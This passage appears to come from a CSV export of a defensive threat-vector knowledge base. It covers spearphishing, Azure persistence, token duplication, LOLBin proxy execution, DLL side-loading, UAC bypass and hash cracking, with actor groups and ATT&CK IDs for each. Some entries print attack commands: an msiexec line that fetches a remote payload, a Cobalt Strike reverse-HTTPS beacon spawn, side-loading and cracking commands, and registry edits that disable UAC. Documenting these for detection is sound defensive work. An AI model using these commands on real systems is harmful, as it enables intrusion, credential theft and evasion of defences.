",2,2025-01-28,2025-10-01,,,,"[Enterprise] APT18, APT18, [Enterprise] Akira, APT29, [Enterprise] APT29, APT39, [Enterprise] APT39, GALLIUM, [Enterprise] Axiom, [Enterprise] Carbanak, [Enterprise] Chimera, [Enterprise] Cinnamon Tempest, [Enterprise] FIN10, [Enterprise] FIN4, [Enterprise] FIN8, [Enterprise] Fox Kitten, [Enterprise] GALLIUM, [Enterprise] Indrik Spider, APT15, [Enterprise] Ke3chang, LAPSUS, [Mobile] LAPSUS$, APT40, [Enterprise] Leviathan","T1078, T1566"
79357f02-6868-4bf5-9f21-1cfd6ab03056,CrackMapExec (CME) on endpoints or being downloaded,Threat Vectors,clear,"CrackMapExec is a post-compromise tool that contains a number of
modules and functionalities that allow red teams, pentesters and
threat actors to perform post-compromise actions. Detecting
both the presence of the tool itself, plus the usage of the tool
is an important baseline security detection.
",2,2022-10-27,2022-10-28,,,,"[ICS] Dragonfly, ENERGETIC BEAR, [Enterprise] APT39, APT39, [Enterprise] MuddyWater, MuddyWater, [ICS] FIN7, FIN7","T1003.002, T1003.003, T1003.004, T1016, T1018, T1049, T1047, T1053.002, T1059.001, T1069.002, T1082, T1083, T1087.002, T1110.001, T1110.003, T1112, T1135, T1201, T1550.002"
1a68b5eb-0112-424d-a21f-88dda0b6b8df,Spearphishing Link,Threat Vectors,clear,"Adversaries may send spearphishing emails with a malicious link in an
attempt to gain access to victim systems. This sub-technique employs
the use of links to download malware, instead of attaching malicious
files to the email itself to avoid defences that may inspect email
attachments.      

All forms of spearphishing are targeted at a specific individual or
company. Generally, the links will be accompanied by social engineering
text and require the user to actively click or copy and paste an URL into
a browser, leveraging user execution. The visited website may compromise
the web browser using an exploit, or the user will be prompted to download
applications, documents, zip files, or even executables depending on the
pretext for the email in the first place. Attackers may also include links
that are intended to interact directly with an email reader, including
embedded images intended to exploit the end system directly or verify
the receipt of an email (i.e. web bugs/web beacons).  

In this type of phishing a threat actor impersonates to appear as
a user's trusted contact like their colleague or other known friends.
Threat actors can also impersonate a large companies with trustworthy
image, brand and reputation to give the emails more believability and
reach. They put deceptive links in the email to entice a victim to
click on the link ref [4, 5].        

In some of the spearphishing campaigns, a threat actor named Webworm
was using GitHub malicious repositories and links to them to spread and
infect more developers and end-users. As GitHub is one of the top million
domains with a lot of visits and clicks the attacker's goal is to hide
in plain sight.   

#### AI-themed phishing campaigns

Adversaries create spearphishing links or sites that mimic AI
applications, which appear to offer legitimate AI tools, tricking
users into downloading and executing trojanised AI-themed software.
For example, this could lead to the installation of Gipy malware,
a strain of infostealer malware that steals sensitive information
and loads additional malicious software from GitHub, including
various types of information stealers and remote access trojans.  

#### Themed-documents lure campaigns 

Several reports mention that the threat actors prepare their campaign 
by using areas of activity and visual identity of companies or public 
administrations in contact with the targets in order to craft more 
deceiving and appealing emails to lure the targets. This preparation
aims to raise the successful rate of the phishing campaigns.  

Spearphishing emails prepared to deal with topics in the areas of an 
Union entity may decive more Union entity staff to follow the link.
ref [b].  

In one campaign it was observed that after direct exchanges over emails 
and whatsapp messages, the victim received an email having a specifically 
crafted politically oriented subject with a malicious link ref [e].    

#### Spearphishing via QR Codes (Quishing)
##### Description

Spearphishing via QR codes, also known as ""quishing,"" is an emerging
cybersecurity threat where attackers use malicious QR codes to target
specific individuals or organizations. This technique combines the
deceptive nature of phishing with the convenience of QR codes to trick
victims into revealing sensitive information or compromising their
devices.  

##### **How Quishing Works**

1. Attackers generate a QR code that leads to a falsified website or
malicious content.
2. The malicious QR code is distributed through various channels, such as
emails, social media, or even physical locations.
3. Victims are lured into scanning the QR code, often under the guise of
accessing exclusive content or necessary information.
4. Upon scanning, users are directed to phishing websites or trigger the
download of malware.  

#### Spearphishing with enbedded HTML link
##### Description

Embedded HTML links in the context of spear phishing, refer
to malicious links that are embedded within an email or message
using HTML code. These links may appear legitimate from a trusted 
source or known organization but actually they mask their true
destionation. For example, they can be encoded or obfuscated
to hide their source destination.  

Example: 

In one of the reports was observed that clicking a malicious HTML
link redirected a victim first to malicious HubSpot Free Forms and then
to credential harvesting pages mimicking Microsoft Azure and Outlook Web
App (OWA) login portals ref [d].      
",5,2022-03-14,2025-10-01,,,,APT42,"T1566.002, T1036, T1656"
5d43ef75-4637-4a75-b1ed-6716052cff0e,Azure - App registration persistence,Threat Vectors,clear,"Azure app registration persistence is a technique where adversaries exploit Azure 
Active Directory (Azure AD) app registration and OAuth application features to maintain 
long-term, often covert, access to a cloud environment. This threat vector is increasingly 
targeted due to the power and longevity of permissions granted to registered applications, 
and the often-overlooked persistence such registrations can provide—even after the 
original user or use case is no longer present.

## How the Threat Works

- **App Registration**: In Azure AD, app registration allows third-party or custom 
applications to integrate with Microsoft 365 or Azure resources. These apps can 
be granted permissions—sometimes highly privileged—to access data, send emails, 
or even manage resources.
- **Persistence Mechanism**: Once an app is registered and consented to (either by a user or administrator), 
it can retain its permissions indefinitely, unless specifically revoked. Attackers 
exploit this by registering their own applications or adding malicious credentials 
to existing ones, ensuring continued access even if user passwords are reset or 
accounts are disabled.
- **Credential Abuse**: Attackers can add new secrets or certificates to an app 
registration (service principal), allowing them to authenticate as the app without 
needing to compromise user credentials again.

## Attack Scenarios

- **Compromising a User or Admin Account**: Attackers first compromise a user or 
administrator account, often via phishing, password spraying, or MFA fatigue attacks.
- **Registering or Manipulating an App**: With access, they either register a new 
OAuth application or add credentials to an existing one. They may grant the app 
excessive permissions, such as the ability to read emails, access files, or manage 
resources.
- **Maintaining Access**: Even if the original compromised account is remediated, 
the attacker’s app can continue to operate using its own credentials, providing 
a persistent backdoor into the environment.
- **Abuse Examples**:
  - Deploying resources (e.g., virtual machines for cryptomining) and incurring 
  significant costs for the victim.
  - Exfiltrating sensitive data from SharePoint, OneDrive, or mailboxes.
  - Launching internal phishing or malware campaigns using the victim’s cloud infrastructure.

## Real-World Examples

- **Storm-1283 Campaign**: Microsoft observed threat actors using compromised accounts 
to register OAuth apps, grant them Contributor roles, and deploy virtual machines 
for cryptomining. The attackers added secrets to both new and existing applications, 
maintaining access and causing substantial financial damage.
- **Supply Chain Attacks**: Attackers with administrator access to a publisher tenant 
can add malicious credentials to legitimate multi-tenant applications, enabling 
unauthorised access to customer environments even if the original administrator 
is removed.
- **Internal Phishing**: Attackers have registered apps to upload and share malicious 
files internally, leveraging default consent settings to spread laterally within 
organisations.
",2,2025-06-02,2025-09-04,,,{'sequence::succeeds': ['c7e260d8-d391-41eb-be1a-7f276c99b383']},,"T1098, T1566.003"
349348ca-66f5-41d2-8610-6bb61556d773,Duplicate an access token in a new process to elevate privileges,Threat Vectors,clear,"An adversary can use automated solutions like CobaltStrike framework
to create a new process with a duplicated token to escalate privileges 
and bypass access controls. An adversary can duplicate a desired access 
token with DuplicateToken(Ex) and use it with CreateProcessWithTokenW 
to create a new process running under the security context of the 
impersonated user. This is useful for creating a new process under 
the security context of a different user.

The new process runs in the security context of the specified token. 
It can optionally load the user profile for the specified user.
Usually the function CreateProcessWithTokenW is running like 
a process winbase.h 

The process that calls CreateProcessWithTokenW must have 
SE_IMPERSONATE_NAME privilege. 

Adversaries commonly use token stealing to elevate their security context 
from the administrator level to the SYSTEM level. An adversary can use a 
token to authenticate to a remote system as the account for that token if the 
account has appropriate permissions on the remote system.

Example for spawn of a process with token duplication:
The process spawn is usually with PID (Process Identifier): 2572

spawn windows/beacon_https/reverse_https (<ip_address>:443) 
in a high integrity process (token duplication)
",4,2022-11-18,2025-10-01,,,,,T1134.002
426a0ab5-66e7-4149-82b0-6357a1cf4b4b,Leverage Windows Utilities for Proxy Execution of Malicious Code,Threat Vectors,clear,"Threat actors frequently exploit legitimate Windows utilities to execute malicious 
code covertly, a technique known as ""Living off the Land"" (LotL). 
By using trusted system binaries, attackers can bypass security measures that focus 
on untrusted or unusual processes, thereby reducing the likelihood of detection.

### 1. Ieexec.exe

**Description**: A utility that executes .NET programs. Threat actors can use ieexec.exe 
to run malicious executables under the guise of Internet Explorer components.

Example:

```
ieexec.exe C:\path\to\malicious.exe
```

### 2. Ie4uinit.exe

**Description**: Initializes user-specific settings for Internet Explorer. 
Can be misused to execute INF files.

Example:

```
ie4uinit.exe -UserIconConfig
```

### 3. Msiexec.exe

**Description**: Used for installing, modifying, and performing operations 
on Windows Installer packages. Threat actors can execute malicious MSI packages or scripts.

Example:

```
msiexec.exe /q /i http://malicious-server/payload.msi
```

### 4. Pcwrun.exe

**Description**: Part of the Performance Counters for Windows. 
It can be exploited to run scripts or executables under certain conditions.

Example:

```
Pcwrun.exe /../../$(calc).exe
```

### 5. DevToolsLauncher.exe

**Description**: Associated with Visual Studio development tools. 
It can be abused to execute code or scripts in the context of development environments.

Example:

> Execute any binary with given arguments and it will call developertoolssvc.exe. 
developertoolssvc is actually executing the binary.

```
devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test
```

### 6. Iediagcmd.exe

**Description**: Diagnostics Utility for Internet Explorer
It can be used to execute binary pre-planted.

Example:

A .url file is sent to the victim or planted on disk.
It sets the WorkingDirectory to \\attacker.webdav.server\share
iediagcmd.exe tries to launch other tools like route.exe, 
netsh.exe, or CustomShellHost.exe.

```
[InternetShortcut]
URL=C:\\Program Files\\Internet Explorer\\iediagcmd.exe
WorkingDirectory=\\\\192.168.8.200@80\\payload
IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
IconIndex=13
ShowCommand=7
```",1,2024-11-04,2024-11-04,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[Enterprise] APT29, UNC2452, [ICS] FIN7, FIN7, [ICS] APT38, Lazarus Group",T1218
4d9cc646-debc-477b-93cb-4ea74c47c02c,Azure - Managed Device Scripting,Threat Vectors,clear,"The following threat vector involves adversaries abusing device management capabilities 
to execute code on devices through services like Intune and Entra ID (AzureAD).

## Example Attack Scenario

An attacker who gains administrative access to AzureAD or Intune can deploy PowerShell 
or Python scripts to managed devices. For example, a compromised AzureAD account 
with device management rights could push a malicious PowerShell script to employee 
laptops using Intune, which then installs ransomware or exfiltrates sensitive data 
without user interaction.

## Attack Goals and Impact

The primary goal is to achieve **remote code execution** across a fleet of managed 
devices. Attackers may aim to:
- Steal credentials or sensitive files
- Install persistence mechanisms for future access
- Deploy ransomware, spyware, or other malware
This can lead to widespread compromise, significant data breaches, and business 
disruption, particularly because device scripting can touch many endpoints simultaneously.

## Attack Flow and Methodology

1. Use administrative capabilities (such as `microsoft.directory/devices/basic/update`) 
to push scripts to selected managed devices.
2. The scripts execute with system-level privileges if the targeting configuration 
is misused, allowing the attacker to harvest data, pivot to other internal resources, 
or further entrench their presence.
3. Attackers may cover tracks by modifying or deleting audit logs accessible through IntuneAuditLogs.
",2,2025-09-01,2025-09-04,,,"{'sequence::succeeds': ['140907eb-c9fb-4330-9d71-656422388b2b', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2743bf18-3b86-4721-bf3e-153dcda0b149'], 'sequence::preceeds': ['61ddc240-e5a6-4ca8-ae77-6b471b498913', '23f6a192-a25d-48b8-a235-7bb55e483682']}","[Enterprise] Akira, APT19, APT28, APT29, [Enterprise] APT3, APT32, APT37, [ICS] Dragonfly, [Enterprise] RedCurl, Rocke, Tonto Team, APT31","T1059, T1021, T1078"
7351e2ca-e198-427c-9cfa-202df36f6e2a,Mimikatz execution on compromised endpoint,Threat Vectors,clear,"Mimikatz is a very versatile tool that comes with a lot of 
options and capabilities. Detection of known Atomic IOCs of 
the mimikatz tool itself or the atomic IOCs of invoke-mimikatz 
powershell scripts, is very important, as it both signals a 
compromised endpoint, plus shows a noisy threat actor trying 
to EoP and move laterally. 
",2,2022-08-05,2022-11-11,,,,"[ICS] Wizard Spider, UNC1878, [Mobile] APT41, APT41, [Enterprise] Kimsuky, TA406, [Enterprise] Threat Group-3390, APT27, [Enterprise] Cobalt Group, Cobalt, [Enterprise] menuPass, APT10, [ICS] Dragonfly, ENERGETIC BEAR, [Enterprise] Whitefly, Whitefly, [Enterprise] Tonto Team, Tonto Team, [Enterprise] Chimera, [Enterprise] CopyKittens, CopyKittens, [Enterprise] Magic Hound, TA453, [ICS] APT38, Lazarus Group, [Enterprise] GALLIUM, GALLIUM, [Enterprise] APT39, APT39, [Enterprise] APT30, APT30, [Enterprise] Blue Mockingbird, [Enterprise] BackdoorDiplomacy, BackdoorDiplomacy, [Enterprise] APT1, APT1, APT20, [Enterprise] APT32, APT32, [ICS] FIN6, FIN6, [Enterprise] Ke3chang, APT15, [Enterprise] MuddyWater, MuddyWater, [Enterprise] TA505, TA505, [Enterprise] Turla, Turla, [ICS] TEMP.Veles, TEMP.Veles, [ICS] FIN7, FIN7, [Mobile] APT28, APT28, [ICS] OilRig, OilRig, [Mobile] Sandworm Team, GreyEnergy, [Enterprise] APT29, UNC2452, [Enterprise] BRONZE BUTLER, Tick, [Enterprise] PittyTiger, APT24, Cutting Kitten, [Enterprise] Leafminer, RASPITE, [ICS] APT33, APT33","T1134.005, T1098, T1547.005, T1555.003, T1555.004, T1003.001, T1003.002, T1003.004, T1003.006, T1207, T1558.001, T1558.002, T1552.004, T1550.002, T1550.003"
8bc82ff8-e106-4377-98f1-2cb912631ffa,User information gathering in Linux systems,Threat Vectors,clear,"Threat actors use various methods and tools to collect user data on Linux
systems. Some of them are given below.

### Common methods used for gathering of user's information on Linux

Examples:

- Current user: for reconnaissance purposes on a Linux system threat actors
  are using commands like `whoami` to retrieve the current username running
  on the system. Threat actors can use and `lslogins` to list an information
  about known users in the system, which typically includes details such as
  the username, UID (User ID), GID (Group ID), home directory, shell, last
  login time, and more, depending on the options used and the system
  configuration ref [1].  
- User list: a threat actor group can use a `getent` command with an option
  `passwd` or `cat /etc/passwd` command to retrieve a list of all users on
  the system ref [1].
- User ID and group ID: the `id` command can be used to retrieve the user ID
  and a group ID of the current user ref [2].
- Group list: a command `groups` <group_name> can be used in Linux to view
  user's group membership. Or with other command `getent group` or cat
  `/etc/group` thereat actors can retrieve a list of all groups on the
  system ref [1],[4].  
- Other user's information: commands like `who` can show an information for
  the current logged-in user. A threat actor may use and `users` command
  to display the list of currently logged-in users on the Linux system
  ref [1].
- Linux user's activity: `w` coomand executed on Linux shows the current
  logged users activity on the system ref [1]. 
- User shell: a threat actor may run the command `getent passwd <username>`
  to retrieve the user's shell. The command output lists the user details
  from the 'passwd' database, including the username, user ID, group ID,
  home directory, and default shell ref [5].  
- Last login: an adversary can use the `lastlog` command to retrieve
  information about the last user's login ref [6]. 
- Failed login attempts: with the `faillog` command a threat actor may
  retrieve information about failed login attempts ref [7].

### Some of the known tools used for Linux user's information collection

- `Metasploit`: A penetration testing framework that includes tools for
  collecting user data and exploiting vulnerabilities.
- `Linux.Ekoms`: This is a custom tool that can collect user data, including
  login credentials and credit card numbers.
- `Linux.Mumblehard`: it's a malware that collects user data and uses it for
  spamming and phishing campaigns.
- `TsarSapphire`: This utility can collect user data, including login
  credentials and sensitive information.
- `Remaiten`: A payload for Linux which collects user data and uses it for
  malicious activities.
- `Kaiten`: A Linux malware that collects user data and potentially can use
  it further for distributed denial-of-service (DDoS) attacks.
- `Linux.Keylogger`: A keylogger that collects user keystrokes, including
  login credentials and sensitive information.
- `Mayhem`: This is a malware that can collect user data on Linux, including
  login credentials and sensitive information, and uses it for malicious
  activities.",1,2025-08-07,2025-08-12,,,"{'sequence::succeeds': ['3b1026c6-7d04-4b91-ba6f-abc68e993616', 'e2d8ce6b-f21e-4444-a828-0c6b722a9c93']}",,T1589
a73c2506-8584-4c0b-bfdc-52e33c8bd229,AppLocker bypass using DLLs,Threat Vectors,clear,"AppLocker bypass using DLLs involves exploiting the way Windows loads DLLs
into processes. An attacker can create a malicious DLL that mimics a
legitimate one, which is allowed to run by AppLocker. When a legitimate
application loads the malicious DLL, it can execute arbitrary code,
effectively bypassing AppLocker restrictions.

A threat actor can bypass AppLocker application whitelisting using DLL
libraries. The reason is that there is no a mechanism for blocking out some
of the default DLLs. 

Additionally, DLLs are not executed directly by the operating system;
instead, they are loaded into the memory space of a process. This makes
it challenging for AppLocker to detect and block malicious DLLs activities.

There are several techniques that can be used to bypass AppLocker
using DLLs:

- DLL Hijacking - a threat actor can create a malicious DLL with the same
  name as a legitimate DLL that is already allowed by AppLocker. When the
  legitimate application loads the DLL, it will load the malicious one
  instead, allowing the attacker to execute arbitrary code.
- DLL Preloading - a threat actor can create a malicious DLL that is loaded
  before the legitimate DLL. This can be done by placing the malicious DLL in
  a directory that is searched before the directory containing the legitimate
  DLL.
- DLL Side-Loading: An attacker can create a malicious DLL that is loaded by
  a legitimate application that is allowed by AppLocker. The malicious DLL can
  then execute arbitrary code.

### DLL hijacking mimics a legitimate DLL name in AppLocker

An attacker can create a malicious DLL with the same name as a legitimate
one, which is allowed to run by AppLocker. The malicious DLL is placed in a
directory that is searched before the legitimate DLL's location.

### Loading a malicious DLL

When a legitimate application loads the malicious DLL, Windows will load the
malicious DLL instead of the legitimate one. This allows the attacker to
execute arbitrary code, bypassing AppLocker restrictions.

### REGSRV32 binary can bypass AppLocker restrictions by executing malicious DLL

Regsvr32.exe is a trusted Windows binary which can be used to bypass
AppLocker restrictions by executing a malicious DLL (e.g., cmd.dll).
Since regsvr32.exe is typically allowed by AppLocker policies and doesn't
rely on cmd.exe or powershell.exe, it can be used to load and run arbitrary
code through exported functions like `DllRegisterServer`. This allows
attackers to execute commands or scripts while avoiding detection and
bypassing common application whitelisting controls ref [1].

### An example of AppLocker bypass using DLLs

As an example to bypass Windows AppLocker a threat actor can create a
malicious DLL named `search.dll` and place it in the `C:\Windows` directory.
When the Windows Search service loads the `search.dll` DLL, it will load the
malicious one instead of the legitimate one.
",1,2025-07-10,2025-07-10,,,,"[Enterprise] APT29, APT29, [ICS] Lazarus Group, Lazarus Group",T1218
f18be76e-f2b3-410a-80c5-d67e7b8e7b03,Perform Microsoft Entra ID connectors MITM attack,Threat Vectors,clear,"These connectors facilitate outbound connections to the Microsoft Entra Private 
Access and application proxy services. They must be installed on a Windows Server 
with access to backend resources. Connectors can be organized into groups to handle 
traffic to specific resources, enhancing management and optimization.  

The risks of man-in-the-middle attacks on Microsoft Entra ID connectors include the 
interception of sensitive information such as authentication tokens, usernames, passwords, 
and authentication artifacts like session cookies. Adversaries can capture this data, 
mimic legitimate users, and potentially bypass multifactor authentication requirements. 
This poses a significant threat to data confidentiality, integrity, and privacy within 
the Microsoft Entra ecosystem. 

Likewise, common techniques used in man-in-the-middle attacks on Microsoft Entra ID connectors include:

- Phishing Attacks
- Session Hijacking
- DNS Spoofing
- OAuth Application Manipulation
- DNS-over-HTTPS
- Cookie Theft
- Business Email Compromise (BEC) Attacks
",1,2024-04-30,2024-04-30,,,,,T1557
9d4658ad-d4d5-4f3c-990f-bb486edd47f4,Usage of CrackMapExec module Masky on compromised endpoint,Threat Vectors,clear,"CrackMapExec is a post-compromise tool that contains a number of
modules and functionalities that allow red teams, pentesters and
threat actors to perform post-compromise actions. Detecting
both the presence of the tool itself, plus the usage of the tool
is an important baseline security detection.

Masky is a python library providing an alternative way to remotely
dump domain users’ credentials thanks to an ADCS. A 
command line tool has been built on top of this library in order to
easily harvest PFX, NT hashes and TGT on a larger 
scope.

This tool does not exploit any new vulnerability and does not work by
dumping the LSASS process memory. Indeed, it 
only takes advantage of legitimate Windows and Active Directory features
(token impersonation, certificate 
authentication via kerberos and NT hashes retrieval via PKINIT).

Masky is a new module, which in certain ways is less noisy than
dumping LSASS, but if AD CS CAs have auditing enabled, will be
very noisy and detectable.
",1,2022-10-28,2022-10-28,,,,,T1003
d5add960-1b86-41d4-869a-1defd392c8f9,Windows User Account Control (UAC) bypass,Threat Vectors,clear,"User Account Control (UAC) is a security feature implemented in the Windows 
operating system to prevent potentially harmful programs from making changes 
to user's computer. The threat actors explore and apply different techniques
and ways to bypass this Winsows security mechanism ref [1].      

For example, some of the used techniques to bypass UAC are:

### DLL Hijacking

This technique involves placing a malicious Dynamic Link Library (DLL) file
in a directory that is part of the system's search path. When the targeted
application loads the required DLL, it inadvertently loads the malicious
DLL instead, granting the attacker elevated privileges.  

Some initially prepared payloads, for example a usage of rundll32.exe can
load a specifically crafted DLL may auto-elevate COM objects and perform
a file operation in a protected directory which would typically require
elevated access.  

### COM Elevation

Component Object Model (COM) is a Microsoft technology used for
communication between software components. By exploiting a vulnerability
in the way the system handles COM objects, an attacker can elevate their
privileges and bypass UAC.  

### Windows Registry modification

A threat actor can change the behavior or the UAC prompt or even completely
turn it off. Their goal is privilege escalation ref [2, 3].    

Example:

```
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
    ""ConsentPromptBehaviorUser""=dword:00000000 ; Automatically deny elevation requests
    ""EnableInstallerDetection""=dword:00000000
````

### Fileless Attacks

Fileless attacks, such as PowerShell or Windows Management Instrumentation
(WMI) exploits, can be used to execute malicious code in memory, without
writing any files to the disk. This allows the attacker to bypass UAC,
as it doesn't monitor in-memory activities.

### Privilege Escalation Vulnerabilities

Some applications may have vulnerabilities that can be exploited to gain
elevated privileges. By exploiting these vulnerabilities, an attacker
can bypass UAC and execute code with higher privileges.

For example, the Github readme page for UACMe contains an extensive list of 
methods that have been discovered and implemented within UACMe or the process
eventvwr.exe can auto-elevate and execute a specified binary or script
ref [7].    

### Malicious software installation (skip the UAC prompt)

Another technique to bypass the UAC could be achieved by malicious software
injected into a trusted process to gain elevated privileges without prompting
a user.
",1,2025-02-06,2025-02-07,,,{'atomicity::implemented': ['68ab86f6-378d-4371-ad01-6209fb95d57d']},"[Enterprise] APT29, APT29, [ICS] Lazarus Group, Lazarus Group",T1548.002
3c4d13c9-d40f-4f97-b8fa-607b6f7ad263,Deletion of Windows Scheduled Task XML file,Threat Vectors,clear,"When a scheduled task is created, different artifacts related to the task
are generated and stored in a XML file. This XML file contains all of the
information about the task, including the name, triggers, actions, and
other settings. In the xml code in the section ""Actions"" is stored a path
to the running task, for example “C:\Windows\System32\task.exe”. Threat
actors may delete the corresponding XML file to a scheduled task to hide
their activities on the system. Threat actors can delete the XML file
manually from C:\Windows\System32\Tasks folder or by using CMD or other
CLId/shells, bash, or PowerShell scripts.

Example for deletion of XML file with bash commands:

cd /mnt/c/Windows/System32/Tasks
rm taskname.xml

Example for deletion of XML file with PowerShell commands:

cd C:\Windows\System32\Tasks
Remove-Item taskname.xml

In cloud infrastructures threat actors are using command-line interface
(CLI) like CloudShell in Azure. 

Example: 

Navigate to the path where the XML file is stored and delete the file with
the command ""del"":

cd C:\Windows\System32\Tasks
del taskname.xml

Deleting the XML file will only remove the task from the Task Scheduler.
It will not uninstall any programs or delete any files that were associated
with the task.
",2,2022-12-20,2022-12-20,,,,"[Enterprise] HAFNIUM, HAFNIUM","T1053.005, T1564"
86f62c3a-6556-4a64-a9f5-a79168ad42d9,Abuse Windows Utilities to Side-Load Malicious DLLs,Threat Vectors,clear,"### 1. Squirrel.exe

**Description**: Associated with the Squirrel installation/update framework. 
Threat actors can perform DLL side-loading by placing a malicious DLL 
that squirrel.exe loads during execution.

Example:

> Attackers place a malicious DLL named Squirrel.dll in the same directory as squirrel.exe.

```
C:\Program Files\App\Squirrel.exe
C:\Program Files\App\Squirrel.dll  (malicious)
```

### 2. Tracker.exe

**Description**: A Windows process related to search indexing. 
It can be abused for DLL side-loading.

Example:

> An attacker places a malicious DLL named tracker.dll in the same directory as tracker.exe.

```
C:\Windows\System32\tracker.exe
C:\Windows\System32\tracker.dll  (malicious)
```

### 3. Tttracer.exe and Ttdinject.exe

**Description**: Part of the Windows Time Travel Tracing toolset. 
Threat actors can inject code into processes or load malicious DLLs.

Example:

```
ttdinject.exe -p <PID> -l C:\path\to\malicious.dll
```

## 4. Wmiprvse.exe\

**Description**: stands for Windows Management Instrumentation Provider Service
Threat actors can exploit wmiprvse.exe for DLL side-loading by placing malicious WMI provider 
DLLs that wmiprvse.exe loads during execution.

Example:

```
C:\Windows\System32\wbem\wmiprvse.exe
C:\Windows\System32\wbem\malicious_provider.dll  (malicious)
```

### 5. InstallUtil.exe\

**Description**: A command-line utility that allows for the installation 
and uninstallation of resources by executing installer components specified 
in .NET assemblies. Threat actors can run malicious code by passing a crafted assembly.

Example:

```
InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\malicious.dll
```

### 6. Odbcconf.exe\

**Description**: Configures ODBC drivers and data source names. Can be used to execute DLLs.

Example:

```
odbcconf.exe /S /A {REGSVR C:\path\to\malicious.dll}
```",1,2024-11-05,2024-11-05,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[ICS] FIN7, FIN7, [ICS] APT38, Lazarus Group, [Enterprise] APT29, UNC2452",T1574.001
35c76d6c-2ac7-486e-b0b7-b56f6b110bec,Password hash cracking on Windows,Threat Vectors,clear,"Threat actors often extract valid credentials from target systems. When
these credentials are in a hashed format, threat actors may use different
methods to crack and obtain the credentials in clear text. When this
information cannot be directly leveraged for higher privileges (like with
pass-the-hash, overpass-the-hash), it is required to crack it. Some methods
that threat actors use include: brute force, dictionary attack, or sub-set
of the dictionary attack named rainbow tables. Threat actors can use
a variety of tools to crack password hashes. For example,
Mimikatz, Hashcat, CrackStation, Password Cracker, Brutus Password Cracker,
Aircrack, THC Hydra, RainbowCrack, Cain and Abel, Medusa, John The Ripper,
ophCrack, WFuzz, L0phtCrack, OphCrack and others.

The threat actors can crack the password hashes, for example with JTR or
Hashcat cracking tools that use text files to match and crack the hashes. 
(an example for a text file could be: rockyou.txt)

gunzip /usr/share/wordlist/file.txt
john hash.txt /usr/share/wordlists/file.txt — format=nt

hashcat -m 1000 hash.txt /usr/share/wordlists/file.txt

An example of how to use Hashcat for a dictionary attack:

hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file

OR 

hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file

Example for Hashcat tool which can bruteforce any password from 4 to 8
characters long:

hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file ""file""

Hashcat can also be started with custom charsets:

hashcat --attack-mode 3 --custom-charset1 ""?u"" --custom-charset2 ""?l?u?d"" --custom-charset3 ""?d"" --hash-type $number $hashes_file ""file""
",2,2023-02-03,2023-02-06,,,,"[ICS] FIN6, FIN6, [ICS] Dragonfly, ENERGETIC BEAR",T1110.002
bcf3bb96-ed97-4853-98ab-937c2d214f4e,Azure - Key Vault persistence,Threat Vectors,clear,"Key Vault persistence refers to techniques attackers use to maintain ongoing, unauthorized 
access to Azure Key Vault and its contents—such as secrets, keys, and certificates—after 
initial compromise or detection. This persistence is typically achieved by modifying 
Key Vault access policies to grant permissions to additional malicious accounts 
or identities.

## How persistence is achieved

- **Access policy modification:**  
  - Attackers with sufficient permissions (such as `Microsoft.KeyVault/vaults/write` 
  or `Microsoft.KeyVault/vaults/accessPolicies/write`) can add their own user account 
  or a service principal to the Key Vault's access policy.
  - This allows the attacker to maintain access even if their original account is 
  disabled or monitored.
- **Privilege escalation:**  
  - Misconfigured roles, such as the ""Key Vault Contributor"" role, can be exploited 
  to grant data access rights, despite the role's intended purpose being limited 
  to management of the Key Vault resource itself.
  - This is possible because the role includes permissions to modify access policies, 
  enabling self-granting of data plane access.

## Attack scenarios

- **Initial access:**  
  - An attacker gains access to an account with Key Vault management permissions, 
  often via phishing or credential theft.
- **Privilege Escalation:**  
  - The attacker uses their permissions to modify Key Vault access policies, granting 
  themselves (or a controlled account) permissions to read, list, or decrypt secrets, 
  keys, and certificates.
- **Persistence:**  
  - The attacker adds additional malicious accounts or service principals to the 
  access policy, ensuring continued access even if their original account is blocked.
- **Data exfiltration and abuse:**  
  - With persistent access, the attacker can periodically extract secrets, keys, 
  or certificates, and use these to compromise other cloud workloads, disrupt operations, 
  or abuse services.

## Real-world risks

- **Data exposure:**  
  - Unauthorized access to secrets (e.g., API keys, connection strings, tokens) 
  can lead to broader system compromise.
- **Compromised credentials:**  
  - Stolen secrets can be used to access other Azure resources or external systems.
- **Stealthy Persistence:**  
  - Attackers can maintain long-term access, making detection and recovery difficult.
- **Service disruption and abuse:**  
  - Attackers may alter configurations, disrupt services, or deploy unauthorized 
  resources using stolen credentials.
",2,2025-06-12,2025-09-04,,,,,"T1098.001, T1548, T1555.006"
58b98d75-fc63-4662-8908-a2a7f4200902,Spearphishing with an attachment extension .rdp,Threat Vectors,clear,"Spearphishing with an attachment extension .rdp refers to a targeted
cyberattack where a malicious actor sends an email containing a file
with the file extension .RDP (Remote Desktop Protocol) to a specific
individual or organization. The attacker may send an attachment to
the end-users directly or by impersonating companies, institutions
or particular individuals, sending the lure on behalf of them
ref [1, 2].       

On October 22, 2024, the National Cyber Security Centers (NCSC) of two
EU countries, as well as governmental organizations [3] reported that
a spear-phishing campaign with .RDP attachment are impersonating their
entities.      

The emails were highly targeted, using social engineering lures relating
to Microsoft, Amazon Web Services (AWS), and the concept of Zero Trust.
The emails contained a Remote Desktop Protocol (RDP) configuration file
signed with a LetsEncrypt certificate. RDP configuration (.RDP) files
summarize automatic settings and resource mappings that are established
when a successful connection to an RDP server occurs ref [1].       

This allows the adversary to potentially deploy additional payloads,
execute local reconnaissance activities, and to redirect targeted users
to credential harvesting sites.  
",1,2024-11-05,2024-11-08,,,{'atomicity::implements': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']},"[Enterprise] APT29, UNC2452","T1566.001, T1204.002, T1036"
8e5c12f1-cd48-417c-a9c9-883212bf98b6,Windows Explorer Manipulation via Registry Modification,Threat Vectors,clear,"Explorer behaviour can be twisted by editing the registry keys
listed below. Changes act instantly, leave few artefacts, and
are often missed by file-centric defenses.

### Policy Edits Disable User Defenses
